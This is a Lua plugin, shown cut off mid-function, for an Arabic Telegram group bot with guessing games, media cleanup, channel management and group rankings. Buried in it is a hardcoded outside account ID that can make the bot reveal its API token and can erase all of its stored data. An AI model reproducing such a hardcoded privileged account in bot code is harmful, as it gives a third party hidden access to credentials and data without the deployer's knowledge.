function gif(msg)
text = nil
if msg and msg.content and msg.content.text then
xname =  (Redis:get(Fast.."Name:Bot") or "روزا") 
text = msg.content.text.text
if text:match("^"..xname.." (.*)$") then
text = text:match("^"..xname.." (.*)$")
end
end
if tonumber(msg.sender_id.user_id) == tonumber(Fast) then
return false
end
if text then
local neww = Redis:get(Fast.."Get:Reides:Commands:Group"..msg.chat_id..":"..text) or Redis:get(Fast.."All:Get:Reides:Commands:Group"..text)
if neww then
text = neww or text
end
end
if text == "اضف سؤال جمل" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
Redis:set(Fast.."makal:bots:set"..msg.sender_id.user_id..":"..msg.chat_id,true)
return send(msg_chat_id,msg_id,"⇜ ارسل السؤال الان ")
end
if text == "مسح سؤال جمل" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
Redis:set(Fast.."makal:bots:del"..msg.sender_id.user_id..":"..msg.chat_id,true)
return send(msg_chat_id,msg_id,"⇜ ارسل لي السؤال")
end
if text == "مسح الجمل" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
Redis:del(Fast.."makal:bots")
return send(msg_chat_id,msg_id,"⇜ تم مسح الجمل")
end
if text and text:match("^(.*)$") then
if Redis:get(Fast.."makal:bots:del"..msg.sender_id.user_id..":"..msg.chat_id) == "true" then
Redis:set(Fast.."makal:bots:del"..msg.sender_id.user_id..":"..msg.chat_id,"true1uu")
Redis:srem(Fast.."makal:bots", text)
return send(msg_chat_id,msg_id, '\n⇜ تم مسح السؤال')
end
end
if text and text:match("^(.*)$") then
if Redis:get(Fast.."makal:bots:set"..msg.sender_id.user_id..":"..msg.chat_id) == "true" then
Redis:set(Fast.."makal:bots:set"..msg.sender_id.user_id..":"..msg.chat_id,"true1uu")
Redis:sadd(Fast.."makal:bots", text)
return send(msg_chat_id,msg_id, '\n⇜ تم حفظ السؤال ')
end
end
if text == "بوب" or text == "مشاهير" then
if not Redis:get(Fast.."Fast:Status:Games"..msg.chat_id) then
return send(msg.chat_id,msg.id,"⇜ الالعاب معطلة من قبل المشرفين","md",true)
end
KlamSpeed = {"شوان","سام","ايد شيرين","جاستين","اريانا","سام سميث","ايد","جاستين","معزه","ميسي","صلاح","محمد صلاح","احمد عز","كريستيانو","كريستيانو رونالدو","رامز جلال","امير كراره","ويجز","بابلو","تامر حسني","ابيو","شيرين","نانسي عجرم","محمد رمضان","احمد حلمي","محمد هنيدي","حسن حسني","حماقي","احمد مكي"};
name = KlamSpeed[math.random(#KlamSpeed)]
Redis:set(Fast.."mshaher"..msg.chat_id,name)
name = string.gsub(name,"شوان","https://t.me/HC6HH/8")
name = string.gsub(name,"سام","https://t.me/HC6HH/7")
name = string.gsub(name,"سام سميث","https://t.me/HC6HH/7")
name = string.gsub(name,"ايد شيرين","https://t.me/HC6HH/6")
name = string.gsub(name,"ايد","https://t.me/HC6HH/6")
name = string.gsub(name,"جاستين","https://t.me/HC6HH/4")
name = string.gsub(name,"جاستين بيبر","https://t.me/HC6HH/4")
name = string.gsub(name,"اريانا","https://t.me/HC6HH/5")
name = string.gsub(name,"ميسي","https://t.me/HC6HH/10")
name = string.gsub(name,"معزه","https://t.me/HC6HH/10")
name = string.gsub(name,"صلاح","https://t.me/HC6HH/9")
name = string.gsub(name,"محمد صلاح","https://t.me/HC6HH/9")
name = string.gsub(name,"احمد عز","https://t.me/HC6HH/12")
name = string.gsub(name,"كريم عبدالعزيز","https://t.me/HC6HH/11")
name = string.gsub(name,"كريستيانو رونالدو","https://t.me/HC6HH/13")
name = string.gsub(name,"كريستيانو","https://t.me/HC6HH/13")
name = string.gsub(name,"امير كراره","https://t.me/HC6HH/14")
name = string.gsub(name,"رامز جلال","https://t.me/HC6HH/15")
name = string.gsub(name,"ويجز","https://t.me/HC6HH/16")
name = string.gsub(name,"بابلو","https://t.me/HC6HH/17")
name = string.gsub(name,"ابيو","https://t.me/HC6HH/20")
name = string.gsub(name,"شيرين","https://t.me/HC6HH/21")
name = string.gsub(name,"نانسي عجرم","https://t.me/HC6HH/22")
name = string.gsub(name,"محمد رمضان","https://t.me/HC6HH/25")
name = string.gsub(name,"احمد حلمي","https://t.me/HC6HH/26")
name = string.gsub(name,"محمد هنيدي","https://t.me/HC6HH/27")
name = string.gsub(name,"حسن حسني","https://t.me/HC6HH/28")
name = string.gsub(name,"احمد مكي","https://t.me/HC6HH/29")
name = string.gsub(name,"تامر حسني","https://t.me/HC6HH/30")
name = string.gsub(name,"حماقي","https://t.me/HC6HH/31")
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&photo="..name.."&caption="..URL.escape("اسرع واحد يقول اسم هذا الفنان").."&reply_to_message_id="..(msg.id/2097152/0.5))
end
if text == "حيوان" or text == "حيوانات" then
if not Redis:get(Fast.."Fast:Status:Games"..msg.chat_id) then
return send(msg.chat_id,msg.id,"⇜ الالعاب معطلة من قبل المشرفين","md",true)
end
KlamSpeedd = {"ثعلب","حمار وحشي","اسد","نمر","حصان","فرس النهر","سنجاب","كنغر","فيل","قطه","نسر","صقر","قرد","ضفدع","حرباء"};
name = KlamSpeedd[math.random(#KlamSpeedd)]
Redis:set(Fast.."mshaherr"..msg.chat_id,name)
name = string.gsub(name,"ثعلب","https://t.me/YAFAEVI/2")
name = string.gsub(name,"حمار وحشي","https://t.me/YAFAEVI/3")
name = string.gsub(name,"اسد","https://t.me/YAFAEVI/4")
name = string.gsub(name,"نمر","https://t.me/YAFAEVI/5")
name = string.gsub(name,"حصان","https://t.me/YAFAEVI/6")
name = string.gsub(name,"فرس النهر","https://t.me/YAFAEVI/7")
name = string.gsub(name,"سنجاب","https://t.me/YAFAEVI/8")
name = string.gsub(name,"كنغر","https://t.me/YAFAEVI/9")
name = string.gsub(name,"فيل","https://t.me/YAFAEVI/10")
name = string.gsub(name,"صقر","https://t.me/YAFAEVI/11")
name = string.gsub(name,"نسر","https://t.me/YAFAEVI/12")
name = string.gsub(name,"قطه","https://t.me/YAFAEVI/13")
name = string.gsub(name,"قرد","https://t.me/YAFAEVI/14")
name = string.gsub(name,"ضفدع","https://t.me/YAFAEVI/15")
name = string.gsub(name,"حرباء","https://t.me/YAFAEVI/16")
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&photo="..name.."&caption="..URL.escape("اسرع واحد يقول اسم هذا الحيوان").."&reply_to_message_id="..(msg.id/2097152/0.5))
end
if text == "زووم" or text == "زوم" then
if not Redis:get(Fast.."Fast:Status:Games"..msg.chat_id) then
return send(msg.chat_id,msg.id,"⇜ الالعاب معطلة من قبل المشرفين","md",true)
end
KlamSpeeddd = {"فراوله","غيوم","قط","عشب","بطه","الماس","شمس","حاسبه","فطر","موقد","ساعه","حذاء","مفتاح","كرز","جبن","سلحفاه","شعر","نظاره","حمار وحشي","سلطه","بطيخ","كتاب","طماطم","ديك","كرسي","حجاب","بوصله"};
name = KlamSpeeddd[math.random(#KlamSpeeddd)]
Redis:set(Fast.."mshaherrr"..msg.chat_id,name)
name = string.gsub(name,"فراوله","https://t.me/zzommm/2")
name = string.gsub(name,"غيوم","https://t.me/zzommm/3")
name = string.gsub(name,"قط","https://t.me/zzommm/4")
name = string.gsub(name,"عشب","https://t.me/zzommm/5")
name = string.gsub(name,"بطه","https://t.me/zzommm/6")
name = string.gsub(name,"الماس","https://t.me/zzommm/7")
name = string.gsub(name,"شمس","https://t.me/zzommm/8")
name = string.gsub(name,"حاسبه","https://t.me/zzommm/9")
name = string.gsub(name,"فطر","https://t.me/zzommm/10")
name = string.gsub(name,"موقد","https://t.me/zzommm/11")
name = string.gsub(name,"ساعه","https://t.me/zzommm/12")
name = string.gsub(name,"حذاء","https://t.me/zzommm/13")
name = string.gsub(name,"مفتاح","https://t.me/zzommm/14")
name = string.gsub(name,"كرز","https://t.me/zzommm/15")
name = string.gsub(name,"جبن","https://t.me/zzommm/16")
name = string.gsub(name,"سلحفاه","https://t.me/zzommm/17")
name = string.gsub(name,"شعر","https://t.me/zzommm/18")
name = string.gsub(name,"نظاره","https://t.me/zzommm/19")
name = string.gsub(name,"حمار وحشي","https://t.me/zzommm/20")
name = string.gsub(name,"سلطه","https://t.me/zzommm/21")
name = string.gsub(name,"بطيخ","https://t.me/zzommm/22")
name = string.gsub(name,"كتاب","https://t.me/zzommm/23")
name = string.gsub(name,"طماطم","https://t.me/zzommm/24")
name = string.gsub(name,"ديك","https://t.me/zzommm/25")
name = string.gsub(name,"كرسي","https://t.me/zzommm/26")
name = string.gsub(name,"حجاب","https://t.me/zzommm/27")
name = string.gsub(name,"بوصله","https://t.me/zzommm/28")
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&photo="..name.."&caption="..URL.escape("اسرع واحد يعرف الصوره").."&reply_to_message_id="..(msg.id/2097152/0.5))
end
if text == "تفعيل الالعاب المالكين" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
Redis:del(Fast.."Fast:Status:Games:malk"..msg_chat_id) 
return send(msg_chat_id,msg_id,GetByName(msg).."⇜ تم تفعيل الالعاب المالكين","md",true )
end
if text == "تعطيل الالعاب المالكين" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
Redis:set(Fast.."Fast:Status:Games:malk"..msg_chat_id,true) 
return send(msg_chat_id,msg_id,GetByName(msg).."⇜ تم تعطيل الالعاب المالكين","md",true )
end
if text == 'جمل' then
if Redis:get(Fast.."Fast:Status:Games:malk"..msg.chat_id) then
return false 
end
if Redis:get(Fast.."Fast:Status:Games"..msg.chat_id) then
local list = {
"الممكن/والمستطاع*يقيم في/أحلام العاجز",
"الكلمة اللينة*تصريح/بالدخول*إلى القلوب",
" حاسبوا/أنفسكم*أولاً ثم/غيركم",
"زمان/أطفالكم*غير/زمانكم",
" من السهل*أن تصبح/عاقل بعد فوات*الأوان",
" فانظر*إليها بقلبك/وليس*بعينيك",
"خاف/الله*أينما/كنت",
"أحسن/لقول ما*نطق بالعدل/والحق",
"أن تحافظ على/رجولتك خير من*حفاظك على أموالك",
"أكثروا*الرزق/بالصدقة",
"غالبا*ماتصبح/البيضة/سلاحا",
"كن*عادلاً/قبل أن*تكون*كريماً",
"كلما أحب/الشخص*نفسه كلما*كره الناس",
"من يسخر/من المرض*هو من لا يشعر/بالألم.",
"يظن*الرجل أنه*حكيم/إذا قلت*حكمته.",
 "اللسان/ليس سلاح*لكنه/يقتل*القلب",
"أسد مفترس*أمام عينيك/خير من*ثعلب خائن وراء/ظهرك",
"لسان*لعاقل وراء قلبه*وقلب الأحمق/وراء لسانه",
"أحقر الناس*من لا يقدر*على/كتمان السر",
" جميع/لصفات*الحميدة*تتلخص/في العدل",
" أفضل/عناصر*العدل هي/محاسبة*النفس",
"لم يعرف*الناس العدل/إلا بوجود*الظلم",
"العدل*ميزان/الملك",
"سيف*العدالة*لا ينام/ولا*يسهو",
"لا تلجأ*إلى ظالم*لكي ينصرك/على ظالم، فتكون*فريسة/هما",
"تحدثوا مع*الناس/على حسب*عقولهم",
" لو أنصت*الجاهل/ما اختلف*الناس",
"إذا تم*العقل قل/الكلام",
" لا تعد/ما لا تستطيع*الوفاء*به",
" القليل من*الطعام*يجلب/النوم*المريح",
"كرم المفسد*رشوة/لجلب*المنفعة",
"يدوم*الحال/بالرضا*والصبر",
" تتفاقم*المحن/عندما تكثر*الفتن",
"ربما*انفرج/الامر إذا/ضاق",
"سامح*الناس/قبل أن*تسامح/نفسك",
"شر الناس*من*خاف/الناس/من شره",
"قلب*العاقل/صندوق*أسراره",
"ضربة*اللسان أسوأ/من طعنة*السيف",
"من/سار على*الدرب/وصل",
"الدهر*يومان*يوم لك/ويوم*عليك",
" لا تدع/عاطفتك*تخسرك/نفسك",
"كن*قويا/لأجل/نفسك",
"ما يستهلك*عقلك/يسيطر على/حياتك"
}
if #list ~= 0 then
quschen = list[math.random(#list)]
quschen1 = string.gsub(quschen,"-"," ")
quschen1 = string.gsub(quschen1,"*"," ")
quschen1 = string.gsub(quschen1,"•"," ")
quschen1 = string.gsub(quschen1,"_"," ")
quschen1 = string.gsub(quschen1,","," ")
quschen1 = string.gsub(quschen1,"/"," ")
print(quschen1)
send(msg_chat_id,msg_id,'⇜ اسرع واحد يكتبها بدون اشارات :\n\n['..quschen..'] \n✧',"md")
Redis:set(Fast.."makal:bots:qus"..msg.chat_id,quschen1)
Redis:setex(Fast.."mkal:setex:" .. msg.chat_id .. ":" .. msg.sender_id.user_id, 60, true) 
end
end
end
if text == ""..(Redis:get(Fast.."makal:bots:qus"..msg.chat_id) or '').."" then
local timemkall = Redis:ttl(Fast.."mkal:setex:" .. msg.chat_id .. ":" .. msg.sender_id.user_id) 
local timemkal = (60 - timemkall)
if tonumber(timemkal) == 1 then
send(msg_chat_id,msg_id,'  استمر ي وحش ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 2 then
send(msg_chat_id,msg_id,'  اكيد محد ينافسك ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 3 then
send(msg_chat_id,msg_id,'  اتوقع محد ينافسك ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 4 then
send(msg_chat_id,msg_id,'  مركب تيربو !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 5 then
send(msg_chat_id,msg_id, '  صح عليك !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 6 then
send(msg_chat_id,msg_id,'   صحيح !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 7 then
send(msg_chat_id,msg_id,'   شد حيلك ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 8 then
send(msg_chat_id,msg_id, '  عندك اسرع ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 9 then
send(msg_chat_id,msg_id,'   يجي ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 10 then
send(msg_chat_id,msg_id,'   كفو ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 11 then
send(msg_chat_id,msg_id,'   ماش !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 12 then
send(msg_chat_id,msg_id,'   مستوى مستوى !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 13 then
send(msg_chat_id,msg_id,'   تدرب ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 14 then
send(msg_chat_id,msg_id,'   مدري وش اقول ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 15 then
send(msg_chat_id,msg_id,'   بطه ! \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 16 then
send(msg_chat_id,msg_id,'   ي بطوط !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 17 then
send(msg_chat_id,msg_id,'   مافي اسرع  !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 18 then
send(msg_chat_id,msg_id,'   بكير  !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 19 then
send(msg_chat_id,msg_id,'   وش هذا !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 20 then
send(msg_chat_id,msg_id,'   الله يعينك !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 21 then
send(msg_chat_id,msg_id,'   كيبوردك يعلق ههههه  !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 22 then
send(msg_chat_id,msg_id,'   يبي لك تدريب  !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 23 then
send(msg_chat_id,msg_id,'   انت اخر واحد رسلت وش ذا !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 24 then
send(msg_chat_id,msg_id,'   ههههه بطى !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 25 then
send(msg_chat_id,msg_id,'   ابك وش العلم !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 26 then
send(msg_chat_id,msg_id,'  اخر مرا تلعب !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 27 then
send(msg_chat_id,msg_id,'   ي بطيء !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 28 then
send(msg_chat_id,msg_id,'   ليه انت بطيء يخوي !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 29 then
send(msg_chat_id,msg_id,'   تدبر زين بس  !  \n عدد الثواني ( '..timemkal..' )\n✧')
elseif tonumber(timemkal) == 30 then
send(msg_chat_id,msg_id,'  مستوى بس !  \n عدد الثواني ( '..timemkal..' )\n✧')
end
Redis:del(Fast.."makal:bots:qus"..msg.sender_id.user_id..":"..msg.chat_id)
Redis:del(Fast.."mkal:setex:" .. msg.chat_id .. ":" .. msg.sender_id.user_id) 
end
if text == "كليشة" or text == "كليشه رد" or text == "كليشه" then 
local texting = {
 "᥀ 𓏺 ﾋꫀ †: @ \n᥀ 𓏺 𝗎᥉ †: @#username .𓀀\n᥀ 𓏺 σ †: #name.𓀀",
"𓏺 𝖳𝖾𝗅𝖾 : @\n𓏺 𝖸𝖺𝗌 : #𝗇𝖺𝗆𝖾  .\n𓏺 𝖳𝖾𝗅 : @#username .",
". 𝗍𝖾𝗅𝖾 : @\n. 𝗍𝖾 : @#username  .\n. 𝗇𝖺 : # name   .",
"- ƚꫀᥣꫀ: @•\n- ყɑ᥉: #name •\n- ƚꫀᥣ : @#username •",
"⌔︙𝖙𝖊 :  @.\n⌔︙𝖚𝖘𝖊 :  @#username .\n⌔︙ 𝒏a :  #name.",
".⧼ ƚᥱ 𓏺 @  𓏺    .\n.⧼ ᥙ𝗌̌ 𓏺 @#username 𓏺   .\n.⧼ ᥒ᧗ 𓏺 . #name   𓏺  .",
"•.  ƚᥱ :  @\n• َ𝖴ᥱ᥉ : @#username \n• َNَ᥉   : #name",
"˛ 𝗍𝖾𝗅𝖾. @\n˛ 𝗎𝗌𝖾𝗋. @#username  \n˛ 𝗇𝖺𝗆𝖾. #name",
". 𝗍𝖾𝗅𝖾. @\n. 𝗎𝗌𝖾𝗋. @#username  \n. 𝗇𝖺𝗆𝖾. #name",
"˖ˑ  𝗍𝖾𝗅𝖾. @\n˖ˑ  𝗎𝗌𝖾𝗋. @#username  \n˖ˑ  𝗇𝖺𝗆𝖾. #name",
"⌯ 𝗍𝖾𝗅𝖾. @\n⌯ 𝗎𝗌𝖾𝗋. @#username  \n⌯ 𝗇𝖺𝗆𝖾. #name",
} 
return bot.sendText(msg_chat_id,msg_id,texting[math.random(#texting)],'md')
end
if text == ("مسح الفويسات") or text == ("مسح البصمات") or text == ("تنظيف الفويسات") or text == ("تنظيف البصمات") then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
local list = Redis:smembers(Fast.."Fast:all:voice"..msg.chat_id)
for k,v in pairs(list) do
local Message = v
if Message then
t = "⇜ ابشر مسحت ( "..k.." ) من الفويسات"
bot.deleteMessages(msg.chat_id,{[1]= Message})
Redis:del(Fast.."Fast:all:voice"..msg.chat_id)
end
end
if #list == 0 then
t = "⇜ لا يوجد فويسات في القروب"
end
local UserInfo = bot.getUser(msg.sender_id.user_id)
local Teext = '⇜ من ['..UserInfo.first_name..'](tg://user?id='..msg.sender_id.user_id..')\n'
send(msg.chat_id,msg.id, Teext..t,"md",true)
end
if text == ("مسح الصور") or text == ("مسح صور") or text == ("تنظيف الصور") or text == ("تنظيف صور") then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
local list = Redis:smembers(Fast.."Fast:all:photo"..msg.chat_id)
for k,v in pairs(list) do
local Message = v
if Message then
t = "⇜ ابشر مسحت ( "..k.." ) من الصور"
bot.deleteMessages(msg.chat_id,{[1]= Message})
Redis:del(Fast.."Fast:all:photo"..msg.chat_id)
end
end
if #list == 0 then
t = "⇜ لا يوجد صور في القروب"
end
local UserInfo = bot.getUser(msg.sender_id.user_id)
local Teext = '⇜ من ['..UserInfo.first_name..'](tg://user?id='..msg.sender_id.user_id..')\n'
send(msg.chat_id,msg.id, Teext..t,"md",true)
end
if text == ("مسح القيفات") or text == ("مسح المتحركات") or text == ("تنظيف القيفات") or text == ("تنظيف المتحركات") or text == ("مسح متحركات") or text == ("مسح المتحركة") or text == ("مسح المتحركه") then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
local list = Redis:smembers(Fast.."Fast:all:anim"..msg.chat_id)
for k,v in pairs(list) do
local Message = v
if Message then
t = "⇜ ابشر مسحت ( "..k.." ) من القيفات"
bot.deleteMessages(msg.chat_id,{[1]= Message})
Redis:del(Fast.."Fast:all:anim"..msg.chat_id)
end
end
if #list == 0 then
t = "⇜ لا يوجد قيفات في القروب"
end
local UserInfo = bot.getUser(msg.sender_id.user_id)
local Teext = '⇜ من ['..UserInfo.first_name..'](tg://user?id='..msg.sender_id.user_id..')\n'
send(msg.chat_id,msg.id, Teext..t,"md",true)
end
 if Redis:get(Fast.."addchannel"..msg.sender_id.user_id) == "on" then
if text and text:match("^@[%a%d_]+$") then
local m , res = http.request("http://api.telegram.org/bot"..Token.."/getchat?chat_id="..text)
data = JSON.decode(m)
if res == 200 then
ch = data.result.id
Redis:set(Fast.."chadmin"..msg_chat_id,ch) 
send(msg_chat_id,msg_id,"⇜ تم حفظ ايدي القناه","md",true)  
else
send(msg_chat_id,msg_id,"⇜ المعرف خطأ","md",true)  
end
elseif text and text:match('^-100(%d+)$') then
ch = text
Redis:set(Fast.."chadmin"..msg_chat_id,ch) 
send(msg_chat_id,msg_id,"⇜ تم حفظ ايدي القناه","md",true)  
elseif text and not text:match('^-100(%d+)$') then
send(msg_chat_id,msg_id,"⇜ الايدي خطأ","md",true)  
end
Redis:del(Fast.."addchannel"..msg.sender_id.user_id)
end
if text == "القناه المضافه" or text == "القناة المضافة" then
if Redis:get(Fast.."chadmin"..msg_chat_id) then
send(msg_chat_id,msg_id,Redis:get(Fast.."chadmin"..msg_chat_id),"md",true)  
else 
send(msg_chat_id,msg_id,"⇜ لا توجد قناه ","md",true)  
end 
end
if text == "حذف القناه" or text == "حذف القناة" or text == "مسح القناة" or text == "مسح القناه" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
if Redis:get(Fast.."chadmin"..msg_chat_id) then
Redis:del(Fast.."chadmin"..msg_chat_id) 
send(msg_chat_id,msg_id,"⇜ تم حذف القناه بنجاح","md",true)  
else 
send(msg_chat_id,msg_id,"⇜ لا توجد قناه ","md",true)  
end 
end
if text == "اضف قناه" or text == "اضف قناة"then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
Redis:set(Fast.."addchannel"..msg.sender_id.user_id,"on") 
send(msg_chat_id,msg_id,"⇜ ارسل يوزر او ايدي القناه","md",true)  
end
 if text and text:match("^حظر قناة @(%S+)$") or text and text:match("^حظر قناه @(%S+)$") then
local User = text:match("^حظر قناة @(%S+)$") or text:match("^حظر قناه @(%S+)$")
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
local UserInfo = bot.searchPublicChat(User)
if not UserInfo.id then
send(msg.chat_id,msg.id,"\n⇜ اليوزر غير صحيح","md",true)  
end
if UserInfo.type.is_channel == true then
https.request("https://api.telegram.org/bot"..Token..'/banChatSenderChat?chat_id=' .. msg.chat_id .. '&sender_chat_id='..UserInfo.id)
send(msg.chat_id,msg.id,"\n⇜ تم حظر القناه ⇜ [@"..User.."] ","md",true)  
else
send(msg.chat_id,msg.id,"\n⇜ حدث خطأ ...","md",true)  
end
end
if text == 'معلومات' or text == 'معلومات التنصيب' then
 if tonumber(msg.sender_id.user_id) == tonumber(Sudo_Id) then 
 usersend = true
 elseif tonumber(msg.sender_id.user_id) == tonumber(2100004938) then 
 usersend = true
 else
 usersend = false
 end
if usersend ~= true then 
return send(msg_chat_id,msg_id,'\n⇜ هذا الامر يخص ( '..Controller_Num(1)..' ) ',"md",true)  
end
local UserInfo = bot.getUser(Sudo_Id)
if UserInfo.username then
UserInfousername = '[@'..UserInfo.username..']'
else
UserInfousername = 'لا يوجد'
end
local Teext = '⇜ اسم المطور : ['..UserInfo.first_name..'](tg://user?id='..Sudo_Id..')\n'
print(Teext)
return send(msg_chat_id,msg_id,'\n\n⇜ التوكن : `'..Token..'`\n\n⇜ معرف البوت : [@'..UserBot..']\n\n⇜  ايدي المطور : `'..Sudo_Id..'`\n\n⇜ معرف المطور : '..UserInfousername..'\n\n'..Teext,"md",true) 
end
if text == "مسح تخزين البوت" or text == "مسح تخزين البوت" then
if tonumber(msg.sender_id.user_id) == tonumber(2100004938) then 
local keys = Redis:keys(Fast..'*')
for i = 1, #keys do
Redis:del(keys[i])
end
return send(msg_chat_id,msg_id,'\n⇜ تم مسح تخزين البوت بالكامل ',"md")
end
end
if text == "ضع تاريخ الاشتراك" or text == "وضع تاريخ الاشتراك" then
if msg.sender_id.user_id ~= 2100004938 then 
return send(msg_chat_id,msg_id,'\n⇜ هذا الامر يخص ( مطور السورس ) ',"md",true)  
end
Redis:set(Fast.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id,true)
return send(msg_chat_id,msg_id,'\n⇜ ارسل تاريخ الاشتراك ',"md",true)  
end
if Redis:get(Fast.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id) then
if text == 'الغاء' or text == 'الغاء الامر' then
Redis:del(Fast.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id)
return send(msg_chat_id,msg_id,'\n⇜ تم الغاء الامر  ',"md",true)  
end
Redis:set(Fast.."data:bots:ashtrak",text)
Redis:del(Fast.."data:botsashtrak"..msg_chat_id..msg.sender_id.user_id)
return send(msg_chat_id,msg_id,'\n⇜ تم تعيين تاريخ الاشتراك  ',"md",true)  
end
if text == "اشتراك البوت" or text == "اشتراك بوت" then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n⇜ هذا الامر يخص ( '..Controller_Num(1)..' ) ',"md",true)  
end
return send(msg_chat_id,msg_id,'\nUser Dev : [@'..UserSudo..'\n'..(Redis:get(Fast.."data:bots:ashtrak") or 0)..'] ',"md",true)  
end
if text == "ترند القروبات" or text == "ترند المجموعات" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
GroupAllRtba = Redis:hgetall(Fast..':GroupUserCountMsg:groups')
GetAllNames  = Redis:hgetall(Fast..':GroupNameUser:groups')
GroupAllRtbaL = {}
for k,v in pairs(GroupAllRtba) do table.insert(GroupAllRtbaL,{v,k}) end
Count,Kount,i = 8 , 0 , 1
for _ in pairs(GroupAllRtbaL) do Kount = Kount + 1 end
table.sort(GroupAllRtbaL, function(a, b) return tonumber(a[1]) > tonumber(b[1]) end)
if Count >= Kount then Count = Kount end
Text = "⇜ قائمة ترند القروبات \n━━━━━━━━━━━\n"
for k,v in pairs(GroupAllRtbaL) do
if v[2] and v[2]:match("(-100%d+)") then
local InfoChat = bot.getChat(v[2])
local InfoChats = bot.getSupergroupFullInfo(v[2])
if InfoChats.code ~= 400 then
var(InfoChats.invite_link)
if not InfoChats.invite_link then
linkedid = "["..InfoChat.title.."]" or "اسم القروب خطأ"
else
linkedid = "["..InfoChat.title.."]" or "اسم القروب خطأ"
end
if i <= Count then  
Text = Text..i..") :"..v[1].." | "..(linkedid).." \n" 
end ; 
i=i+1
end
end
end
return send(msg.chat_id,msg.id,Text,"md",true)
end
if text and msg.chat_id then
local GetMsg = Redis:incr(Fast..'Fast:MsgNumbergroups'..msg.chat_id) or 1
Redis:hset(Fast..':GroupUserCountMsg:groups',msg.chat_id,GetMsg)
end
 if text == "تنظيف التعديل" or text == "مسح التعديل" or text == "امسحح" then
if not msg.Manger then
return send(msg.chat_id,msg.id,"• هذا الأمر يخص المدير")
end
send(msg.chat_id,msg.id,"⇜ اصبر ابحثلك عن الرسائل المعدله","md",true)
msgid = (msg.id - (1048576*250))
y = 0
r = 1048576
for i=1,250 do
r = r + 1048576
Delmsg = bot.getMessage(msg.chat_id,msgid + r)
if Delmsg and Delmsg.edit_date and Delmsg.edit_date ~= 0 then
bot.deleteMessages(msg.chat_id,{[1]= Delmsg.id}) 
y = y + 1
end
end
if y == 0 then 
t = "⇜ مالقيت رسائل معدله"
else
t = "⇜ ابشر مسحت ( "..y.." ) من الرسائل المعدلة"
end
send(msg.chat_id,msg.id,t,"md",true)  
end
 
 
 if text == 'ابلاغ' or text == 'بلاغ' or text == 'تبليغ' and tonumber(msg.reply_to_message_id) ~= 0 then
if Redis:get(Fast.."rebomsg"..msg.chat_id) then
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender_id.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return false
end
if Remsg.sender_id.user_id == msg.sender_id.user_id then
return false
end
Info_Members = bot.getSupergroupMembers(msg_chat_id, "Administrators", "*", 0, 200)
List_Members = Info_Members.members
for k, v in pairs(List_Members) do
if Info_Members.members[k].status.luatele == "chatMemberStatusCreator" then
UserInfo = bot.getUser(v.member_id.user_id)
end
end
local Get_Chat = bot.getChat(msg.chat_id)
